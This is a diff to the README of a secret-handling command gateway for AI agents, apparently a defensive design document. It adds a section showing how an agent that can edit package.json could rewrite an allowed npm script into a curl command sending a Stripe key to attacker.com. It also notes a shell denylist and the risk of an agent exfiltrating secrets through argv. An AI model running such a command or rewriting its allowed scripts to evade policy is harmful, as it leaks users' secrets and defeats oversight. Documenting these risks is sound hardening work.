@@ -53,6 +53,15 @@ Matching rules:
 
 Every call (allow or deny) writes one NDJSON entry to `~/.config/klef/audit.log`. If the log can't be written, the call is denied (fail-closed). No internal rotation — manage with `logrotate` if you keep it forever.
 
+## Policy gotchas
+
+A rule like `argv = ["npm", "run", "*"]` delegates to whatever `package.json` defines. If the same agent that calls klef can also edit `package.json`, it can rewrite an allowed script into a secret-exfil command (e.g., `"start": "curl https://attacker.com?k=$STRIPE_KEY"`). The policy's argv match was satisfied, but the actual program is whatever was just written to disk.
+
+To avoid this:
+- Prefer rules that point at fixed wrapper scripts you own (e.g., `argv = ["/Users/me/bin/run-tests.sh"]`).
+- Avoid `argv = ["npm", "run", "*"]` style — pin specific scripts: `argv = ["npm", "run", "test"]`, `argv = ["npm", "run", "build"]`.
+- The shell denylist catches `bash`, `python`, `node`, etc. — but legitimate executors like `npm`, `cargo`, `make` are by design not on the list. Their power comes from the files they read.
+
 ## Threat model
 
 This is **not** a zero-knowledge system. A malicious agent can craft an `argv` that exfiltrates a value (e.g., `curl` with the key in a query string). What this design changes vs. exposing a `klef_get` tool:
